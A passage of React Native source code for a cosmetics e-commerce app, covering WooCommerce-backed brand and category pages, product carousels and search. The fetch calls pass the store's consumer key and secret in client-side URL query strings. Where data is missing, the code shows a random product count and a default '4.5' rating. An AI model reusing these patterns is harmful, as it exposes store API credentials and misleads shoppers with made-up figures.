    'rgba(70, 130, 180, 0.85)',   // SteelBlue - soft
    'rgba(218, 165, 32, 0.85)',   // Goldenrod - soft
    'rgba(205, 92, 92, 0.85)',    // IndianRed - soft
    'rgba(106, 90, 205, 0.85)',   // SlateBlue - soft
    'rgba(32, 178, 170, 0.85)',   // LightSeaGreen - soft
    'rgba(255, 99, 71, 0.85)',    // Tomato - soft
    'rgba(147, 112, 219, 0.85)',  // MediumPurple - soft
    'rgba(60, 179, 113, 0.85)',   // MediumSeaGreen - soft
    'rgba(255, 105, 180, 0.85)',  // HotPink - soft
    'rgba(74, 144, 226, 0.85)',   // Soft Blue
    'rgba(231, 76, 60, 0.85)',    // Soft Red
    'rgba(39, 174, 96, 0.85)',    // Soft Green
    'rgba(243, 156, 18, 0.85)',   // Soft Orange
  ];

  // Fallback demo brands (in case API fails)
  const demoBrands = [
    { id: 1, name: 'Cetaphil', image: 'https://images.pexels.com/photos/4041392/pexels-photo-4041392.jpeg?w=200', count: 45 },
    { id: 2, name: 'The Body Shop', image: 'https://images.pexels.com/photos/4041391/pexels-photo-4041391.jpeg?w=200', count: 38 },
    { id: 3, name: 'Bombay Shaving Company', image: 'https://images.pexels.com/photos/3738347/pexels-photo-3738347.jpeg?w=200', count: 52 },
    { id: 4, name: 'Booty', image: 'https://images.pexels.com/photos/4041396/pexels-photo-4041396.jpeg?w=200', count: 29 },
    { id: 5, name: 'Brut', image: 'https://images.pexels.com/photos/3738346/pexels-photo-3738346.jpeg?w=200', count: 41 },
    { id: 6, name: 'Beauty Garage', image: 'https://images.pexels.com/photos/4041398/pexels-photo-4041398.jpeg?w=200', count: 33 },
    { id: 7, name: 'Villain', image: 'https://images.pexels.com/photos/3738348/pexels-photo-3738348.jpeg?w=200', count: 27 },
    { id: 8, name: 'Dove', image: 'https://images.pexels.com/photos/4041399/pexels-photo-4041399.jpeg?w=200', count: 56 },
    { id: 9, name: 'Nivea', image: 'https://images.pexels.com/photos/3738349/pexels-photo-3738349.jpeg?w=200', count: 48 },
    { id: 10, name: "L'Oreal Paris", image: 'https://images.pexels.com/photos/4041400/pexels-photo-4041400.jpeg?w=200', count: 62 },
    { id: 11, name: 'Maybelline', image: 'https://images.pexels.com/photos/3738350/pexels-photo-3738350.jpeg?w=200', count: 44 },
    { id: 12, name: 'Lakme', image: 'https://images.pexels.com/photos/4041401/pexels-photo-4041401.jpeg?w=200', count: 39 },
    { id: 13, name: 'Forest Essentials', image: 'https://images.pexels.com/photos/4041402/pexels-photo-4041402.jpeg?w=200', count: 31 },
    { id: 14, name: 'Plum', image: 'https://images.pexels.com/photos/3738351/pexels-photo-3738351.jpeg?w=200', count: 47 },
    { id: 15, name: 'Mamaearth', image: 'https://images.pexels.com/photos/4041403/pexels-photo-4041403.jpeg?w=200', count: 53 },
    { id: 16, name: 'Wow Skin Science', image: 'https://images.pexels.com/photos/3738352/pexels-photo-3738352.jpeg?w=200', count: 42 },
  ];

  // Fetch brands from WooCommerce API
  const fetchBrandsFromAPI = async () => {
    try {
      let allBrands = [];
      let page = 1;
      let hasMore = true;
      
      while (hasMore) {
        const url = `${API_URL}/brands?per_page=100&page=${page}&consumer_key=${CONSUMER_KEY}&consumer_secret=${CONSUMER_SECRET}`;
        const response = await fetch(url);
        const result = await response.json();
        
        let brandsArray = [];
        if (Array.isArray(result)) {
          brandsArray = result;
        } else if (result.data && Array.isArray(result.data)) {
          brandsArray = result.data;
        } else if (result.brands && Array.isArray(result.brands)) {
          brandsArray = result.brands;
        } else {
          hasMore = false;
          break;
        }
        
        if (brandsArray.length === 0) {
          hasMore = false;
          break;
        }
        
        const validBrands = brandsArray.filter(brand => brand && (brand.id || brand.term_id) && brand.name);
        allBrands = [...allBrands, ...validBrands];
        
        if (brandsArray.length < 100) {
          hasMore = false;
        } else {
          page++;
        }
        
        if (page > 10) {
          hasMore = false;
        }
      }
      
      console.log(`Total brands fetched: ${allBrands.length}`);
      
      if (allBrands.length === 0) {
        return demoBrands;
      }
      
      return allBrands.map(brand => ({
        id: brand.id || brand.term_id,
        name: brand.name,
        slug: brand.slug || brand.name.toLowerCase().replace(/\s+/g, '-'),
        image: brand.image?.src || brand.image || `https://picsum.photos/seed/${brand.name.replace(/\s/g, '')}/200/200`,
        count: brand.count || brand.product_count || Math.floor(Math.random() * 100) + 10
      }));
      
    } catch (error) {
      console.error("Error fetching brands:", error);
      return demoBrands;
    }
  };
// Add this function inside BrandsPage component
const extractBrandsFromProducts = (products) => {
  const brandMap = new Map();
  
  products.forEach(product => {
    // Extract from brands array
    if (product.brands && Array.isArray(product.brands)) {
      product.brands.forEach(brand => {
        if (brand && (brand.id || brand.name)) {
          const brandId = brand.id || brand.name;
          if (!brandMap.has(brandId)) {
            brandMap.set(brandId, {
              id: brandId,
              name: brand.name,
              slug: brand.slug || brand.name.toLowerCase().replace(/\s+/g, '-'),
              count: 0
            });
          }
          const existing = brandMap.get(brandId);
          existing.count += 1;
          brandMap.set(brandId, existing);
        }
      });
    }
    
    // If no brands, try to infer from categories
    if ((!product.brands || product.brands.length === 0) && product.categories) {
      const commonBrands = ['Lakme', 'Maybelline', 'Nivea', 'Dove', 'Cetaphil', 
                            'The Body Shop', 'Plum', 'Mamaearth', "L'Oreal", 'Forest Essentials'];
      
      product.categories.forEach(cat => {
        const matchedBrand = commonBrands.find(brand => 
          cat.name.toLowerCase().includes(brand.toLowerCase())
        );
        
        if (matchedBrand && !brandMap.has(matchedBrand)) {
          brandMap.set(matchedBrand, {
            id: matchedBrand,
            name: matchedBrand,
            slug: matchedBrand.toLowerCase().replace(/\s+/g, '-'),
            count: 1
          });
        } else if (matchedBrand) {
          const existing = brandMap.get(matchedBrand);
          existing.count += 1;
          brandMap.set(matchedBrand, existing);
        }
      });
    }
  });
  
  const result = Array.from(brandMap.values());
  console.log(`Extracted ${result.length} unique brands from ${products.length} products`);
  return result.sort((a, b) => b.count - a.count);
};
  // Fetch products for carousel (limit to 10)
  const fetchProductsByBrand = async (brandName) => {
  const productsToSearch = allProductsCache.length > 0 ? allProductsCache : await fetchProducts(1, 50);
  
  const filteredProducts = productsToSearch.filter(product => {
    if (product.brands && Array.isArray(product.brands)) {
      return product.brands.some(brand => 
        brand.name?.toLowerCase() === brandName.toLowerCase()
      );
    }
    if (product.categories && Array.isArray(product.categories)) {
      return product.categories.some(cat => 
        cat.name?.toLowerCase().includes(brandName.toLowerCase())
      );
    }
    return false;
  });
  
  return filteredProducts.slice(0, 10);
};

const fetchAllProductsByBrand = async (brandName) => {
  // Use the cached all products instead of fetching again
  const productsToSearch = allProductsCache.length > 0 ? allProductsCache : await fetchProducts(1, 50);
  
  const filteredProducts = productsToSearch.filter(product => {
    // Check multiple possible brand locations
    
    // 1. Check product.brands array
    if (product.brands && Array.isArray(product.brands)) {
      const hasBrand = product.brands.some(brand => 
        brand.name?.toLowerCase() === brandName.toLowerCase() ||
        brand.slug?.toLowerCase() === brandName.toLowerCase()
      );
      if (hasBrand) return true;
    }
    
    // 2. Check product.categories
    if (product.categories && Array.isArray(product.categories)) {
      const hasBrandCategory = product.categories.some(cat => 
        cat.name?.toLowerCase().includes(brandName.toLowerCase())
      );
      if (hasBrandCategory) return true;
    }
    
    // 3. Check product.tags
    if (product.tags && Array.isArray(product.tags)) {
      const hasBrandTag = product.tags.some(tag => 
        tag.name?.toLowerCase() === brandName.toLowerCase()
      );
      if (hasBrandTag) return true;
    }
    
    // 4. Check product name
    if (product.name?.toLowerCase().includes(brandName.toLowerCase())) {
      return true;
    }
    
    return false;
  });
  
  console.log(`📦 ${brandName}: Found ${filteredProducts.length} products out of ${productsToSearch.length}`);
  return filteredProducts;
};

  useEffect(() => {
    loadBrands();
  }, []);

  useEffect(() => {
    filterBrands();
  }, [searchQuery]);

  // Update the loadBrands function in BrandsPage
const loadBrands = async () => {
  setLoading(true);
  
  // First try cached brands
  try {
    const cachedBrands = await AsyncStorage.getItem('brands_list');
    if (cachedBrands) {
      const { data, timestamp } = JSON.parse(cachedBrands);
      if (Date.now() - timestamp < 10 * 60 * 1000) {
        console.log(`⚡ Using cached brands: ${data.length} brands`);
        setBrands(data);
        setFilteredBrands(data);
        setLoading(false);
      }
    }
  } catch (error) {
    console.log("Brand cache error:", error);
  }
  
  // Wait for all products to load
  let products = allProductsCache;
  if (products.length === 0) {
    // Load first page quickly for initial display
    products = await fetchProducts(1, 50);
    setAllProductsCache(products);
  }
  
  // Extract brands from products
  const extractedBrands = extractBrandsFromProducts(products);
  setBrands(extractedBrands);
  setFilteredBrands(extractedBrands);
  setLoading(false);
  
  // Cache brands
  await AsyncStorage.setItem('brands_list', JSON.stringify({
    data: extractedBrands,
    timestamp: Date.now()
  }));
  
  // Load remaining products in background
  if (products.length < 100) {
    const allProducts = await fetchAllProducts();
    if (allProducts.length > products.length) {
      setAllProductsCache(allProducts);
      const allBrands = extractBrandsFromProducts(allProducts);
      setBrands(allBrands);
      setFilteredBrands(allBrands);
    }
  }
};

  const filterBrands = () => {
    let filtered = [...brands];
    if (searchQuery) {
      filtered = filtered.filter(brand => 
        brand.name && brand.name.toLowerCase().includes(searchQuery.toLowerCase())
      );
    }
    setFilteredBrands(filtered);
  };

  const handleBrandPress = async (brand) => {
    setSelectedBrand(brand);
    setLoadingBrandProducts(true);
    setShowProductsPage(true);
    
    const products = await fetchAllProductsByBrand(brand.name);
    setBrandProducts(products);
    setLoadingBrandProducts(false);
  };

  const goBackToBrands = () => {
    setShowProductsPage(false);
    setSelectedBrand(null);
    setBrandProducts([]);
  };

  const clearFilters = () => {
    setSearchQuery('');
    setShowSearch(false);
  };

  // Brand Section Component (Colored Card + Product Carousel) - OPTIMIZED
  // Brand Section Component (Colored Card + Product Carousel)
// Brand Section Component (Colored Card + Product Carousel)
const BrandSection = ({ brand, index }) => {
  const [products, setProducts] = useState([]);
  const [isLoading, setIsLoading] = useState(true);  // Start as true
  const bgColor = cardColors[index % cardColors.length];

  useEffect(() => {
    loadProducts();
  }, []);

  const loadProducts = async () => {
    setIsLoading(true);
    const fetchedProducts = await fetchProductsByBrand(brand.name);
    setProducts(fetchedProducts);
    setIsLoading(false);
  };

  return (
    <View style={{ marginBottom: 40 }}>
      {/* Colored Card */}
      <TouchableOpacity
        style={{
          backgroundColor: bgColor,
          borderRadius: 20,
          paddingTop: 20,
          paddingBottom: 80,
          paddingHorizontal: 16,
          marginHorizontal: 16,
          position: 'relative',
          elevation: 4,
          shadowColor: '#000',
          shadowOffset: { width: 0, height: 4 },
          shadowOpacity: 0.15,
          shadowRadius: 8,
          height: 160,
        }}
        onPress={() => handleBrandPress(brand)}
        activeOpacity={0.9}
      >
        {/* Brand Name at Top Right */}
        <Text style={{
          position: 'absolute',
          top: 16,
          right: 16,
          fontSize: 24,
          fontWeight: '300',
          color: '#FFFFFF',
          fontFamily: Platform.OS === 'ios' ? 'Didot' : 'serif',
          letterSpacing: 2,
          textAlign: 'right',
          maxWidth: '60%',
          fontStyle: 'normal',
          textShadow: '0px 1px 2px rgba(0,0,0,0.2)',
        }}>
          {brand.name}
        </Text>
        
        {/* Product Count */}
        <Text style={{
          position: 'absolute',
          bottom: 16,
          left: 16,
          fontSize: 13,
          fontWeight: '500',
          color: 'rgba(255,255,255,0.9)',
          fontFamily: Platform.OS === 'ios' ? 'AvenirNext-Medium' : 'sans-serif-medium',
          letterSpacing: 0.5,
        }}>
          {brand.count || 0} PRODUCTS
        </Text>
      </TouchableOpacity>

      {/* Product Carousel - Always visible */}
      <View style={{
        marginTop: -50,
        marginHorizontal: 16,
        backgroundColor: 'transparent',
        borderRadius: 16,
        paddingVertical: 8,
      }}>
        {isLoading ? (
          <View style={{ padding: 20, alignItems: 'center', backgroundColor: '#fff', borderRadius: 16, borderWidth: 1, borderColor: '#D4AF37' }}>
            <ActivityIndicator size="small" color="#D4AF37" />
            <Text style={{ marginTop: 8, fontSize: 12, color: '#D4AF37' }}>Loading products...</Text>
          </View>
        ) : products.length === 0 ? (
          <View style={{ padding: 20, alignItems: 'center', backgroundColor: '#fff', borderRadius: 16, borderWidth: 1, borderColor: '#D4AF37' }}>
            <Ionicons name="cube-outline" size={40} color="#D4AF37" />
            <Text style={{ fontSize: 12, color: '#D4AF37', marginTop: 8 }}>No products available</Text>
          </View>
        ) : (
          <ScrollView 
            horizontal 
            showsHorizontalScrollIndicator={false}
            contentContainerStyle={{ paddingHorizontal: 8, gap: 12 }}
          >
            {products.map((product) => (
              <TouchableOpacity
                key={product.id}
                style={{ 
                  width: 130,
                  backgroundColor: '#fff',
                  borderRadius: 16,
                  padding: 8,
                  elevation: 5,
                  shadowColor: '#000',
                  shadowOffset: { width: 0, height: 4 },
                  shadowOpacity: 0.15,
                  shadowRadius: 8,
                  borderWidth: 1,
                  borderColor: '#D4AF37',
                }}
                onPress={() => navigation.navigate('ProductDetail', { 
                  product: { ...product, price: parseFloat(product.price) } 
                })}
              >
                <Image 
                  source={{ uri: product.images?.[0]?.src || 'https://via.placeholder.com/120' }} 
                  style={{ 
                    width: '100%', 
                    height: 120, 
                    borderRadius: 12, 
                    resizeMode: 'cover',
                    backgroundColor: '#f5f5f5',
                  }} 
                />
                <Text style={{
                  fontSize: 11,
                  fontWeight: '500',
                  color: '#1E90FF',
                  marginTop: 6,
                  textAlign: 'center',
                }} numberOfLines={2}>
                  {product.name}
                </Text>
                <Text style={{
                  fontSize: 12,
                  fontWeight: 'bold',
                  color: '#4169E1',
                  marginTop: 4,
                  textAlign: 'center',
                }}>
                  ₹{parseFloat(product.price).toFixed(0)}
                </Text>
              </TouchableOpacity>
            ))}
          </ScrollView>
        )}
      </View>
    </View>
  );
};
  // Products Page Component (shown when a brand is clicked)
const BrandProductsPage = () => {
  const { addToCart } = useContext(CartContext);
  const { wishlist, addToWishlist, removeFromWishlist, isInWishlist } = useContext(WishlistContext);

  const ProductCard = ({ item, index }) => {
    const fadeAnim = useRef(new Animated.Value(0)).current;
    const translateY = useRef(new Animated.Value(50)).current;

    useEffect(() => {
      Animated.parallel([
        Animated.timing(fadeAnim, { toValue: 1, duration: 400, delay: index * 50, useNativeDriver: true }),
        Animated.timing(translateY, { toValue: 0, duration: 400, delay: index * 50, useNativeDriver: true })
      ]).start();
    }, []);

    const handleAddToCart = (e) => {
      e.stopPropagation();
      addToCart({ ...item, price: parseFloat(item.price), quantity: 1 });
      Vibration.vibrate(50);
    };

    const handleWishlist = (e) => {
      e.stopPropagation();
      if (isInWishlist(item.id)) {
        removeFromWishlist(item.id);
      } else {
        addToWishlist(item);
      }
    };

    const discount = item.regular_price && item.regular_price !== item.price 
      ? Math.round(((parseFloat(item.regular_price) - parseFloat(item.price)) / parseFloat(item.regular_price)) * 100)
      : 0;

    return (
      <Animated.View style={{ 
        opacity: fadeAnim, 
        transform: [{ translateY }], 
        width: '50%',
        paddingHorizontal: 6,
        marginBottom: 12,
      }}>
        <TouchableOpacity
          activeOpacity={0.9}
          style={{
            backgroundColor: '#fff',
            borderRadius: 15,
            overflow: 'hidden',
            elevation: 3,
            shadowColor: '#1E90FF',
            shadowOffset: { width: 0, height: 2 },
            shadowOpacity: 0.1,
            shadowRadius: 4,
            flex: 1,
          }}
          onPress={() => navigation.navigate('ProductDetail', { 
            product: { ...item, price: parseFloat(item.price) } 
          })}
        >
          <View style={styles.productImageContainer}>
            <Image 
              source={{ uri: item.images?.[0]?.src }} 
              style={{ 
                width: '100%', 
                height: 200,
                resizeMode: 'cover',
              }} 
              onError={(e) => {
                console.log('Brand product image failed:', item.id, item.images?.[0]?.src);
                e.currentTarget.src = 'https://via.placeholder.com/300?text=Product';
              }}
              onLoad={() => console.log('Brand product image loaded:', item.id)}
            />
            {discount > 0 && (
              <View style={styles.saleTag}>
                <Text style={styles.saleTagText}>{discount}% OFF</Text>
              </View>
            )}
            <TouchableOpacity
              style={styles.wishlistButton}
              onPress={handleWishlist}
            >
              <Ionicons name={isInWishlist(item.id) ? 'heart' : 'heart-outline'} size={22} color={isInWishlist(item.id) ? '#ff4444' : '#fff'} />
            </TouchableOpacity>
          </View>
          <View style={{ padding: 12 }}>
            <View style={styles.productNamePriceRow}>
              <Text style={styles.productName} numberOfLines={2}>{item.name}</Text>
              <Text style={styles.productPrice}>₹{parseFloat(item.price).toFixed(2)}</Text>
            </View>
            {item.regular_price && item.regular_price !== item.price && (
              <Text style={styles.originalPrice}>₹{parseFloat(item.regular_price).toFixed(2)}</Text>
            )}
            <View style={styles.productFooter}>
              <View style={styles.ratingContainer}>
                <Ionicons name="star" size={14} color="#FFB800" />
                <Text style={styles.ratingText}>{item.average_rating || '4.5'}</Text>
              </View>
              <TouchableOpacity
                style={styles.addButton}
                onPress={handleAddToCart}
              >
                <Ionicons name="cart-outline" size={16} color="#fff" />
                <Text style={styles.addButtonText}>Add</Text>
              </TouchableOpacity>
            </View>
          </View>
        </TouchableOpacity>
      </Animated.View>
    );
  };

  return (
    <View style={{ flex: 1, backgroundColor: '#FFF0F5' }}>
      {/* Header */}
      <View style={{
        flexDirection: 'row',
        alignItems: 'center',
        paddingHorizontal: 16,
        paddingTop: Platform.OS === 'ios' ? 50 : 40,
        paddingBottom: 16,
        backgroundColor: '#fff',
        borderBottomWidth: 1,
        borderBottomColor: '#f0f0f0',
      }}>
        <TouchableOpacity onPress={goBackToBrands} style={{
          width: 40,
          height: 40,
          borderRadius: 20,
          backgroundColor: '#FFF0F5',
          justifyContent: 'center',
          alignItems: 'center',
        }}>
          <Ionicons name="arrow-back" size={24} color="#1E90FF" />
        </TouchableOpacity>
        <Text style={{
          fontSize: 20,
          fontWeight: 'bold',
          color: '#1E90FF',
          flex: 1,
          textAlign: 'center',
        }}>
          {selectedBrand?.name}
        </Text>
        <View style={{ width: 40 }} />
      </View>

      {/* Products Count */}
      <View style={{
        paddingHorizontal: 16,
        paddingVertical: 12,
        backgroundColor: '#fff',
        marginBottom: 8,
      }}>
        <Text style={{ fontSize: 14, color: '#1E90FF' }}>
          {brandProducts.length} products found
        </Text>
      </View>

      {/* Products Grid */}
      {loadingBrandProducts ? (
        <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>
          <ActivityIndicator size="large" color="#1E90FF" />
          <Text style={{ marginTop: 16, color: '#1E90FF' }}>Loading products...</Text>
        </View>
      ) : brandProducts.length === 0 ? (
        <View style={{
          flex: 1,
          justifyContent: 'center',
          alignItems: 'center',
          paddingTop: 100,
        }}>
          <Ionicons name="cube-outline" size={80} color="#ccc" />
          <Text style={{ fontSize: 18, fontWeight: 'bold', color: '#1E90FF', marginTop: 20 }}>
            No products found
          </Text>
          <Text style={{ fontSize: 14, color: '#4169E1', marginTop: 8, marginBottom: 20 }}>
            No products available from {selectedBrand?.name}
          </Text>
          <TouchableOpacity onPress={goBackToBrands} style={{
            backgroundColor: '#1E90FF',
            paddingHorizontal: 30,
            paddingVertical: 12,
            borderRadius: 25,
          }}>
            <Text style={{ color: '#FFF0F5', fontSize: 16, fontWeight: '600' }}>Back to Brands</Text>
          </TouchableOpacity>
        </View>
      ) : (
        <FlatList
          data={brandProducts}
          keyExtractor={(item, index) => item?.id?.toString() || index.toString()}
          numColumns={2}
          showsVerticalScrollIndicator={false}
          renderItem={({ item, index }) => <ProductCard item={item} index={index} />}
          columnWrapperStyle={{ 
            justifyContent: 'space-between', 
            paddingHorizontal: 8,
          }}
          contentContainerStyle={{ 
            paddingBottom: 20,
            paddingTop: 8,
          }}
          initialNumToRender={4}
          maxToRenderPerBatch={6}
          windowSize={5}
          removeClippedSubviews={true}
        />
      )}
    </View>
  );
};

  // Search Header Component
  const SearchHeader = () => {
    return (
      <View style={{
        backgroundColor: '#FFF0F5',
        paddingTop: Platform.OS === 'ios' ? 50 : 40,
        paddingBottom: 12,
        paddingHorizontal: 16,
        borderBottomWidth: 1,
        borderBottomColor: '#f0f0f0',
      }}>
        <View style={{
          flexDirection: 'row',
          alignItems: 'center',
          justifyContent: 'space-between',
          marginBottom: 12,
        }}>
          <TouchableOpacity 
            onPress={() => navigation.goBack()} 
            style={{
              width: 40,
              height: 40,
              borderRadius: 20,
              backgroundColor: '#fff',
              justifyContent: 'center',
              alignItems: 'center',
              elevation: 2,
            }}
          >
            <Ionicons name="arrow-back" size={24} color="#1E90FF" />
          </TouchableOpacity>
          
          <Text style={{
            fontSize: 20,
            fontWeight: 'bold',
            color: '#1E90FF',
            fontFamily: Platform.OS === 'ios' ? 'Didot' : 'serif',
          }}>Brands</Text>
          
          <TouchableOpacity 
            onPress={() => setShowSearch(!showSearch)} 
            style={{
              width: 40,
              height: 40,
              borderRadius: 20,
              backgroundColor: '#fff',
              justifyContent: 'center',
              alignItems: 'center',
              elevation: 2,
            }}
          >
            <Ionicons name="search-outline" size={24} color="#1E90FF" />
          </TouchableOpacity>
        </View>

        {showSearch && (
          <View style={{ paddingBottom: 8 }}>
            <View style={{
              flexDirection: 'row',
              alignItems: 'center',
              backgroundColor: '#fff',
              borderRadius: 12,
              paddingHorizontal: 15,
              paddingVertical: 12,
              gap: 10,
            }}>
              <Ionicons name="search-outline" size={20} color="#1E90FF" />
              <TextInput
                ref={searchInputRef}
                style={{ flex: 1, fontSize: 16, color: '#1E90FF' }}
                placeholder="Search brands..."
                placeholderTextColor="#999"
                value={searchQuery}
                onChangeText={setSearchQuery}
                autoFocus={true}
              />
              {searchQuery.length > 0 && (
                <TouchableOpacity onPress={() => setSearchQuery('')}>
                  <Ionicons name="close-circle" size={20} color="#1E90FF" />
                </TouchableOpacity>
              )}
            </View>
            {searchQuery.length > 0 && (
              <View style={{
                flexDirection: 'row',
                justifyContent: 'space-between',
                alignItems: 'center',
                marginTop: 10,
                paddingHorizontal: 4,
              }}>
                <Text style={{ fontSize: 13, color: '#1E90FF' }}>
                  {filteredBrands.length} brands found
                </Text>
                <TouchableOpacity onPress={clearFilters}>
                  <Text style={{ fontSize: 13, color: '#1E90FF', fontWeight: '500' }}>Clear</Text>
                </TouchableOpacity>
              </View>
            )}
          </View>
        )}
      </View>
    );
  };

  if (showProductsPage) {
    return <BrandProductsPage />;
  }

  if (loading) {
    return (
      <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#FFF0F5' }}>
        <ActivityIndicator size="large" color="#1E90FF" />
        <Text style={{ marginTop: 16, fontSize: 16, color: '#1E90FF' }}>Loading brands...</Text>
      </View>
    );
  }

  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: '#FFF0F5' }}>
      <SearchHeader />
      
      <ScrollView
        showsVerticalScrollIndicator={false}
        contentContainerStyle={{ paddingBottom: 40 }}
      >
        {/* Separator */}
        <View style={{
          height: 1,
          backgroundColor: '#e0e0e0',
          marginHorizontal: 16,
          marginVertical: 8,
        }} />
        
        {/* ALL Brand Sections - Products load only when tapped */}
        {filteredBrands.length === 0 ? (
          <View style={{ padding: 40, alignItems: 'center' }}>
            <Ionicons name="business-outline" size={80} color="#ccc" />
            <Text style={{ fontSize: 18, fontWeight: 'bold', color: '#1E90FF', marginTop: 20 }}>
              No brands found
            </Text>
            <Text style={{ fontSize: 14, color: '#4169E1', marginTop: 8, textAlign: 'center' }}>
              Try adjusting your search
            </Text>
          </View>
        ) : (
          filteredBrands.map((brand, index) => (
            <BrandSection 
              key={brand.id} 
              brand={brand} 
              index={index}
            />
          ))
        )}
        
        <View style={{ height: 20 }} />
      </ScrollView>
    </SafeAreaView>
  );
};
// ========== CATEGORY PAGE (UPDATED) ==========

  // Category Section Component (Colored Card + Product Carousel)
  // ========== CATEGORY PAGE (OPTIMIZED) ==========
const CategoryPage = ({ navigation }) => {
  const [categories, setCategories] = useState([]);
  const [filteredCategories, setFilteredCategories] = useState([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [loading, setLoading] = useState(true);
  const [showSearch, setShowSearch] = useState(false);
  const [selectedCategory, setSelectedCategory] = useState(null);
  const [categoryProducts, setCategoryProducts] = useState([]);
  const [showProductsPage, setShowProductsPage] = useState(false);
  const [loadingCategoryProducts, setLoadingCategoryProducts] = useState(false);
  
  const searchInputRef = useRef(null);
  const scrollY = useRef(new Animated.Value(0)).current;

  // Softer premium colors for category cards
  const cardColors = [
    'rgba(139, 69, 19, 0.85)',    // SaddleBrown - soft
    'rgba(46, 139, 87, 0.85)',    // SeaGreen - soft
    'rgba(70, 130, 180, 0.85)',   // SteelBlue - soft
    'rgba(218, 165, 32, 0.85)',   // Goldenrod - soft
    'rgba(205, 92, 92, 0.85)',    // IndianRed - soft
    'rgba(106, 90, 205, 0.85)',   // SlateBlue - soft
    'rgba(32, 178, 170, 0.85)',   // LightSeaGreen - soft
    'rgba(255, 99, 71, 0.85)',    // Tomato - soft
    'rgba(147, 112, 219, 0.85)',  // MediumPurple - soft
    'rgba(60, 179, 113, 0.85)',   // MediumSeaGreen - soft
    'rgba(255, 105, 180, 0.85)',  // HotPink - soft
    'rgba(74, 144, 226, 0.85)',   // Soft Blue
    'rgba(231, 76, 60, 0.85)',    // Soft Red
    'rgba(39, 174, 96, 0.85)',    // Soft Green
    'rgba(243, 156, 18, 0.85)',   // Soft Orange
  ];

  // Fetch real categories from WooCommerce
  const fetchCategoriesFromAPI = async () => {
    try {
      let allCategories = [];
      let page = 1;
      let hasMore = true;
      
      while (hasMore) {
        const url = `${API_URL}/products/categories?per_page=100&page=${page}&consumer_key=${CONSUMER_KEY}&consumer_secret=${CONSUMER_SECRET}&hide_empty=false`;
        const response = await fetch(url);
        const data = await response.json();
        
        if (data.length > 0) {
          allCategories = [...allCategories, ...data];
          page++;
        } else {
          hasMore = false;
        }
      }
      
      console.log(`Fetched ${allCategories.length} categories`);
      return allCategories;
    } catch (error) {
      console.error("Error fetching categories:", error);
      return [];
    }
  };

  // Fetch products for a specific category (full list for products page)
  const fetchProductsForCategory = async (categoryId) => {
    try {
      const url = `${API_URL}/products?category=${categoryId}&per_page=50&consumer_key=${CONSUMER_KEY}&consumer_secret=${CONSUMER_SECRET}`;
      const response = await fetch(url);
      const data = await response.json();
      return data;
    } catch (error) {
      console.error(`Error fetching products for category:`, error);
      return [];
    }
  };

  // Fetch products for carousel (limit to 10)
  const fetchProductsByCategory = async (categoryId) => {
    try {
      const url = `${API_URL}/products?category=${categoryId}&per_page=10&consumer_key=${CONSUMER_KEY}&consumer_secret=${CONSUMER_SECRET}`;
      const response = await fetch(url);
      const data = await response.json();
      return data;
    } catch (error) {
      console.error(`Error fetching products for category ${categoryId}:`, error);
      return [];
    }
  };

  useEffect(() => {
    loadCategories();
  }, []);

  useEffect(() => {
    filterCategories();
  }, [searchQuery]);

  const loadCategories = async () => {
    setLoading(true);
    const data = await fetchCategoriesFromAPI();
    setCategories(data);
    setFilteredCategories(data);
    setLoading(false);
  };

  const filterCategories = () => {
    let filtered = [...categories];
    if (searchQuery) {
      filtered = filtered.filter(category => 
        category.name.toLowerCase().includes(searchQuery.toLowerCase())
      );
    }
    setFilteredCategories(filtered);
  };

  const handleCategoryPress = async (category) => {
    setSelectedCategory(category);
    setLoadingCategoryProducts(true);
    setShowProductsPage(true);
    
    const products = await fetchProductsForCategory(category.id);
    setCategoryProducts(products);
    setLoadingCategoryProducts(false);
  };

  const goBackToCategories = () => {
    setShowProductsPage(false);
    setSelectedCategory(null);
    setCategoryProducts([]);
  };

  const clearFilters = () => {
    setSearchQuery('');
    setShowSearch(false);
  };

  // Products Page Component (shown when a category is clicked)
  const CategoryProductsPage = () => {
    const { addToCart } = useContext(CartContext);
    const { wishlist, addToWishlist, removeFromWishlist, isInWishlist } = useContext(WishlistContext);

    const ProductCard = ({ item, index }) => {
      const fadeAnim = useRef(new Animated.Value(0)).current;
      const translateY = useRef(new Animated.Value(50)).current;

      useEffect(() => {
        Animated.parallel([
          Animated.timing(fadeAnim, { toValue: 1, duration: 400, delay: index * 50, useNativeDriver: true }),
          Animated.timing(translateY, { toValue: 0, duration: 400, delay: index * 50, useNativeDriver: true })
        ]).start();
      }, []);

      const handleAddToCart = (e) => {
        e.stopPropagation();
        addToCart({ ...item, price: parseFloat(item.price), quantity: 1 });
        Vibration.vibrate(50);
      };

      const handleWishlist = (e) => {
        e.stopPropagation();
        if (isInWishlist(item.id)) {
          removeFromWishlist(item.id);
        } else {
          addToWishlist(item);
        }
      };

      const discount = item.regular_price && item.regular_price !== item.price 
        ? Math.round(((parseFloat(item.regular_price) - parseFloat(item.price)) / parseFloat(item.regular_price)) * 100)
        : 0;

      return (
        <Animated.View style={{ opacity: fadeAnim, transform: [{ translateY }], width: '50%' }}>
          <TouchableOpacity
            activeOpacity={0.9}
            style={styles.productCard}
            onPress={() => navigation.navigate('ProductDetail', { 
              product: { ...item, price: parseFloat(item.price) } 
            })}
          >
            <View style={styles.productImageContainer}>
<Image 
  source={{ uri: convertToSupportedImageFormat(item.images?.[0]?.src) }} 
  style={styles.productImage} 
  onError={(e) => {
    e.currentTarget.src = 'https://via.placeholder.com/300?text=Product';
  }}
/>
              {discount > 0 && (
                <View style={styles.saleTag}>
                  <Text style={styles.saleTagText}>{discount}% OFF</Text>
                </View>
              )}
              <TouchableOpacity
                style={styles.wishlistButton}
                onPress={handleWishlist}
              >
                <Ionicons name={isInWishlist(item.id) ? 'heart' : 'heart-outline'} size={22} color={isInWishlist(item.id) ? '#ff4444' : '#fff'} />
              </TouchableOpacity>
            </View>
            <View style={styles.productInfo}>
              <View style={styles.productNamePriceRow}>
                <Text style={styles.productName} numberOfLines={2}>{item.name}</Text>
                <Text style={styles.productPrice}>₹{parseFloat(item.price).toFixed(2)}</Text>
              </View>
              {item.regular_price && item.regular_price !== item.price && (
                <Text style={styles.originalPrice}>₹{parseFloat(item.regular_price).toFixed(2)}</Text>
              )}
              <View style={styles.productFooter}>
                <View style={styles.ratingContainer}>
                  <Ionicons name="star" size={14} color="#FFB800" />
